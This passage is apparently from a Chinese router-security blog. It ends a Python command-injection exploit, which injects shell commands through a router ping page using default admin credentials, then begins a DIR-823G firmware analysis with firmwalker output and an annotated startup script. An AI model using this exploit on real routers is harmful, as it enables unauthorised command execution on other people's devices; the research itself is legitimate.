class="hljs-string">&quot;http://192.168.1.1/Main_Analysis_Content.asp&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><span class="hljs-comment"># 创建一个 Session 对象，用于保持会话状态</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 发送请求</span><br>session.<span class="hljs-built_in">get</span>(burp0_url, <span class="hljs-attribute">headers</span>=burp0_headers)<br><br>burp1_url = <span class="hljs-string">&quot;http://192.168.1.1:80/Main_Analysis_Content.asp&quot;</span><br>burp1_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>, <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Basic YWRtaW46YWRtaW4=&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://192.168.1.1/apply.cgi?current_page=Main_Analysis_Content.asp&amp;next_page=Main_Analysis_Content.asp&amp;group_id=&amp;modified=0&amp;action_mode=+Refresh+&amp;action_script=&amp;action_wait=&amp;first_time=&amp;preferred_lang=EN&amp;SystemCmd=ping+-c+5+%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;firmver=3.0.0.4&amp;cmdMethod=ping&amp;destIP=%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;pingCNT=5&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>session.<span class="hljs-built_in">get</span>(burp1_url, <span class="hljs-attribute">headers</span>=burp1_headers)<br><br>def execute_shell_command(command):<br>    try:<br>        result = subprocess.<span class="hljs-built_in">run</span>(command, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">check</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">stdout</span>=subprocess.PIPE, <span class="hljs-attribute">stderr</span>=subprocess.PIPE, <span class="hljs-attribute">universal_newlines</span>=<span class="hljs-literal">True</span>)<br>        return result.stdout.strip()<br>    except subprocess.CalledProcessError as e:<br>        return f<span class="hljs-string">&quot;Error executing command: &#123;e&#125;&quot;</span><br>    except Exception as e:<br>        return f<span class="hljs-string">&quot;Error: &#123;e&#125;&quot;</span><br><br><span class="hljs-comment">#这里调用linux系统命令有点多此一举，也可以直接调用request库获取返回包</span><br>command = <span class="hljs-string">&quot;curl http://192.168.1.1/test13.asp -H &#x27;Authorization: Basic YWRtaW46YWRtaW4=&#x27;&quot;</span><br>output = execute_shell_command(command)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Command output:&quot;</span>)<br><span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723221523818.png" alt="image-20240723221523818"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>dir-823G固件分析</title>
    <link href="/2024/07/07/dir-823G%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/07/dir-823G%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="dir-823G固件分析"><a href="#dir-823G固件分析" class="headerlink" title="dir-823G固件分析"></a>dir-823G固件分析</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>固件名：DIR823G_V1.0.2B05_20181207.bin</p><ul><li>型号：DIR823G</li><li>版本：V1.0.2B05_20181207</li><li>官网：<a href="https://www.dlink.com/">https://www.DLINK.com/</a></li><li>测试环境：Ubuntu 18.04</li></ul><p>binwalk -Me 解包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803200112593.png" alt="image-20240803200112593"></p><p>firmwalker枚举</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><code class="hljs shell">***Firmware Directory***<br>/home/iot/gujian/_DIR823G_V1.0.2B05_20181207.bin.extracted/squashfs-root/<br>***Search for password files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### passwd</span></span><br>/bin/passwd<br>/etc/passwd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### shadow</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.psk</span></span><br><br>***Search for Unix-MD5 hashes***<br>/home/iot/gujian/_DIR823G_V1.0.2B05_20181207.bin.extracted/squashfs-root/etc/shadow.sample:$1$KEKJV2R0$TFJ4jy7waGKrjdNHwPGzV.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.key</span></span><br>/etc/privateKey.key<br><br>***Search for files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.conf</span></span><br>/etc/resolv.conf<br>/etc/boa/boa.conf<br>/etc/host.conf<br>/etc/ushare.conf<br>/etc/wscd.conf<br>/etc/samba/smb.conf<br>/etc/minidlna.conf<br>/etc/lld2d.conf<br>/etc/vsftpd.conf<br><br>***Search for shell scripts***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### shell scripts</span></span><br>/usr/share/udhcpc/eth1.3.sh<br>/usr/share/udhcpc/br0.sh<br>/usr/share/udhcpc/eth1.2.sh<br>/usr/share/udhcpc/usb0.sh<br>/usr/share/udhcpc/wlan0.sh<br>/usr/share/udhcpc/eth1.1.sh<br>/usr/share/udhcpc/eth1.4.sh<br>/usr/share/udhcpc/wlan0-vxd.sh<br>/usr/share/udhcpc/wlan1.sh<br>/usr/share/udhcpc/wlan1-vxd.sh<br>/usr/share/udhcpc/eth1.sh<br>/usr/share/udhcpc/eth0.sh<br>/bin/ddns.sh<br>/bin/disconnect.sh<br>/bin/wlanapp.sh<br>/bin/dhcp6cRcv.sh<br>/bin/l2tp.sh<br>/bin/pppoe_conn_patch.sh<br>/bin/reinit.sh<br>/bin/mp_98c.sh<br>/bin/pppoe.sh<br>/bin/init.sh<br>/bin/connect6.sh<br>/bin/connect.sh<br>/bin/pptp.sh<br>/bin/pppoe_disc_patch.sh<br>/bin/snmpd.sh<br>/bin/killsh.sh<br>/bin/set_rx_gain_from_flash.sh<br>/bin/ip_qos.sh<br>/bin/firewall.sh<br>/bin/mp.sh<br>/bin/startup.sh<br>/web_mtn/cgi-bin/ExportSettings.sh<br>/web_mtn/cgi-bin/GetDownLoadSyslog.sh<br><br>***Search for other .bin files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### bin files</span></span><br><br>***Search for patterns in files***<br>-------------------- upgrade --------------------<br>/bin/goahead<br>/bin/boa<br>/bin/autoUpgradeFirmware<br>/bin/mtn_upgrade<br>/web/navigation.js<br>/web/menu.htm<br>/web/upload.htm<br><br>-------------------- admin --------------------<br>/bin/goahead<br>/bin/iptables<br>/web_mtn/account.html<br>/web_mtn/Wizard.html<br>/web_mtn/js/Login.js<br>/web_mtn/js/SOAP/SOAPLogin.js<br>/web_mtn/js/checkTimeout.js<br>/web/super_password.htm<br><br>-------------------- root --------------------<br>/bin/goahead<br>/bin/tc<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/timelycheck<br>/bin/boa<br>/bin/speedtest<br>/bin/brctl<br>/bin/miniigd<br>/bin/dnsmasq<br>/bin/isAutoSettings<br>/bin/dnrd<br>/bin/sysconf<br>/bin/flash<br>/bin/wscd<br>/bin/iptables<br>/web_mtn/js/libajax.js<br>/web_mtn/js/json2.js<br>/web_mtn/SharePortSetup.html<br>/etc/boa/boa.conf<br>/etc/passwd_orig<br>/etc/group_orig<br>/etc/tmp/picsdesc.xml<br>/etc/tmp/picsdesc.skl<br>/etc/shadow.sample<br>/etc/minidlna.conf<br>/etc/vsftpd.conf<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br>/lib/libmxml.so.1<br>/lib/libmxml.so<br>/web/wlmultipleap.htm<br>/web/wlsecurity.htm<br>/web/wlwps.htm<br><br>-------------------- password --------------------<br>/bin/goahead<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/timelycheck<br>/bin/boa<br>/bin/fact<br>/bin/ppp_inet<br>/bin/sysconf<br>/bin/orayddns<br>/web_mtn/Network.html<br>/web_mtn/account.html<br>/web_mtn/Guestwireless.html<br>/web_mtn/Wizard.html<br>/web_mtn/Ddns.html<br>/web_mtn/Login.html<br>/web_mtn/js/comm.js<br>/web_mtn/js/libajax.js<br>/web_mtn/js/layer/layer.js<br>/web_mtn/js/SOAP/SOAPDdns.js<br>/web_mtn/js/SOAP/SOAPWizard.js<br>/web_mtn/js/SOAP/SOAPNetwork.js<br>/web_mtn/js/jquery-1.8.2.min.js<br>/web_mtn/js/jquery.js<br>/web_mtn/js/jquery.validate.js<br>/web_mtn/Diagnosis.html<br>/web_mtn/css/style_page.css<br>/web_mtn/SharePortSetup.html<br>/web_mtn/Wireless.html<br>/etc/samba/smb.conf<br>/web/super_password.htm<br>/web/ddns.htm<br>/web/wlwdsenp.htm<br>/web/util_gw.js<br>/web/storage_createuser.htm<br>/web/tcpip_multiwan.htm<br>/web/wizard.htm<br>/web/password.htm<br>/web/util_qos.js<br>/web/openvpn.htm<br>/web/navigation.js<br>/web/tcpipwan.htm<br>/web/wlsurvey.htm<br>/web/menu.htm<br>/web/wlsecurity_all.htm<br><br>-------------------- passwd --------------------<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/timelycheck<br>/bin/getpppoeinfo<br>/bin/sysconf<br>/web_mtn/account.html<br>/web_mtn/Guestwireless.html<br>/web_mtn/Wizard.html<br>/web_mtn/js/AES.js<br>/web_mtn/Wireless.html<br>/etc/samba/smb.conf<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br>/lib/libuClibc-0.9.33.so<br><br>-------------------- pwd --------------------<br>/bin/tc<br>/bin/busybox<br>/bin/curl<br>/bin/wget<br><br>-------------------- dropbear --------------------<br><br>-------------------- ssl --------------------<br>/bin/curl<br>/bin/wget<br>/etc/group_orig<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br><br>-------------------- private key --------------------<br>/bin/curl<br>/etc/privateKey.key<br>/etc/serverkey.pem<br><br>-------------------- telnet --------------------<br>/bin/curl<br>/bin/fact<br>/etc/services<br>/etc/ushare.conf<br>/etc/fact.xml<br><br>-------------------- secret --------------------<br>/bin/pppd<br>/bin/curl<br><br>-------------------- pgp --------------------<br>/bin/goahead<br>/bin/routed<br>/bin/speedtest<br>/bin/speedcheck<br>/etc/mime.types<br><br>-------------------- gpg --------------------<br>/bin/goahead<br>/bin/speedtest<br>/bin/speedcheck<br><br>-------------------- token --------------------<br>/bin/goahead<br>/bin/tc<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/boa<br>/bin/miniigd<br>/web_mtn/js/libajax.js<br>/web/wlsch.htm<br>/web/wlsecurity_all.htm<br><br>-------------------- oauth --------------------<br>/bin/curl<br><br>-------------------- cmd= --------------------<br>/bin/main_lc5761<br>/web_mtn/Wireless.html<br><br>-------------------- command= --------------------<br>/bin/iapp<br><br>-------------------- config --------------------<br>/bin/goahead<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/boa<br>/bin/saveConfigToFile<br>/bin/speedcheck<br>/bin/dnsmasq<br>/bin/udhcpd<br>/bin/flash<br>/bin/wscd<br>/bin/orayddns<br>/web_mtn/js/comm.js<br>/web_mtn/js/jquery.selectbox-0.2_new.js<br>/web_mtn/js/layer/layer.js<br>/web_mtn/js/layer/mobile/layer.js<br>/web_mtn/js/jquery.cookie.js<br>/web_mtn/cgi-bin/ExportSettings.sh<br>/etc/wscd.conf<br>/etc/samba/smb.conf<br>/etc/vsftpd.conf<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br>/lib/libapmib.so<br>/web/wlan_schedule.htm<br>/web/saveconf.htm<br>/web/openvpn.htm<br>/web/tcpip_multiwanlist.htm<br>/web/navigation.js<br>/web/8021q_vlan.htm<br>/web/wlwps.htm<br><br>***Search for web servers***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### search for web servers</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### goahead</span></span><br>/bin/goahead<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### boa</span></span><br>/bin/boa<br>/etc/boa<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### tftp</span></span><br>/bin/tftp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### busybox</span></span><br>/bin/busybox<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### telnetd</span></span><br>/bin/telnetd<br><br>***Search for urls***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### urls</span></span><br>http://172.16.6.102 页面管理本设备。同时，请确认上行路由器维护 IP 地址不是172.16.6.102，避免 IP 冲突导致网络异常。&lt;<br><br></code></pre></td></tr></table></figure><p>重要信息：</p><p>&#x2F;etc&#x2F;init.d&#x2F;rcS</p><p>&#x2F;bin&#x2F;telnetd</p><p>&#x2F;bin&#x2F;goahead</p><p>goahead是mips架构小端</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803215750320.png" alt="image-20240803215750320"></p><p>分析启动项rcS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>ifconfig lo 127.0.0.1 // 配置回环网络接口，设置IP地址为127.0.0.1<br><br>CINIT=1 // 设置环境变量CINIT为1<br><br>hostname rlx-linux // 设置主机名为rlx-linux<br><br>mount -t proc proc /proc // 挂载proc文件系统到/proc<br>mount -t ramfs ramfs /var // 挂载ramfs文件系统到/var<br>if [ -d &quot;/hw_setting&quot; ];then<br>    mount -t yaffs2 -o tags-ecc-off -o inband-tags /dev/mtdblock1 /hw_setting // 如果存在/hw_setting目录，挂载yaffs2文件系统到/hw_setting<br>fi<br><br>mkdir /var/tmp // 创建/var/tmp目录<br>mkdir /var/web // 创建/var/web目录<br>mkdir /var/log // 创建/var/log目录<br>mkdir /var/run // 创建/var/run目录<br>mkdir /var/lock // 创建/var/lock目录<br>mkdir /var/system // 创建/var/system目录<br>mkdir /var/dnrd // 创建/var/dnrd目录<br>mkdir /var/avahi // 创建/var/avahi目录<br>mkdir /var/dbus-1 // 创建/var/dbus-1目录<br>mkdir /var/run/dbus // 创建/var/run/dbus目录<br>mkdir /var/lib // 创建/var/lib目录<br>mkdir /var/lib/misc // 创建/var/lib/misc目录<br>mkdir /var/home // 创建/var/home目录<br>mkdir /var/root // 创建/var/root目录<br>mkdir /var/tmp/net // 创建/var/tmp/net目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">##for tr069</span></span><br>mkdir /var/cwmp_default // 创建/var/cwmp_default目录<br>mkdir /var/cwmp_config // 创建/var/cwmp_config目录<br><br>if [ ! -f /var/cwmp_default/DefaultCwmpNotify.txt ]; then<br>cp -p /etc/DefaultCwmpNotify.txt /var/cwmp_default/DefaultCwmpNotify.txt 2&gt;/dev/null // 如果/var/cwmp_default/DefaultCwmpNotify.txt不存在，则从/etc复制文件到/var/cwmp_default<br>fi<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#For miniigd</span></span><br>mkdir /var/linuxigd // 创建/var/linuxigd目录<br>cp /etc/tmp/pics* /var/linuxigd 2&gt;/dev/null // 复制/etc/tmp/pics*到/var/linuxigd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#For pptp</span></span><br>mkdir /var/ppp // 创建/var/ppp目录<br>mkdir /var/ppp/peers // 创建/var/ppp/peers目录<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">smbd</span><br>mkdir /var/config // 创建/var/config目录<br>mkdir /var/private // 创建/var/private目录<br>mkdir /var/tmp/usb // 创建/var/tmp/usb目录<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">snmpd</span><br>mkdir /var/net-snmp // 创建/var/net-snmp目录<br><br>cp /bin/pppoe.sh /var/ppp/true // 复制/bin/pppoe.sh到/var/ppp/true<br>echo &quot;#!/bin/sh&quot; &gt; /var/ppp/true // 覆盖/var/ppp/true内容为#!/bin/sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PASS&quot;</span>     &gt;&gt; /var/ppp/true</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">for</span> console login</span><br>cp /etc/shadow.sample /var/shadow // 复制/etc/shadow.sample到/var/shadow<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">for</span> weave</span><br>cp /etc/avahi-daemon.conf /var/avahi // 复制/etc/avahi-daemon.conf到/var/avahi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">extact web pages</span><br>cd /web // 切换到/web目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash">flash extr /web</span><br>cd / // 切换到根目录<br><br>mkdir -p /var/udhcpc // 创建/var/udhcpc目录<br>mkdir -p /var/udhcpd // 创建/var/udhcpd目录<br>cp /bin/init.sh /var/udhcpc/eth0.deconfig // 复制/bin/init.sh到/var/udhcpc/eth0.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/eth0.deconfig // 清空/var/udhcpc/eth0.deconfig文件内容<br>cp /bin/init.sh /var/udhcpc/eth1.deconfig // 复制/bin/init.sh到/var/udhcpc/eth1.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/eth1.deconfig // 清空/var/udhcpc/eth1.deconfig文件内容<br>cp /bin/init.sh /var/udhcpc/br0.deconfig // 复制/bin/init.sh到/var/udhcpc/br0.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/br0.deconfig // 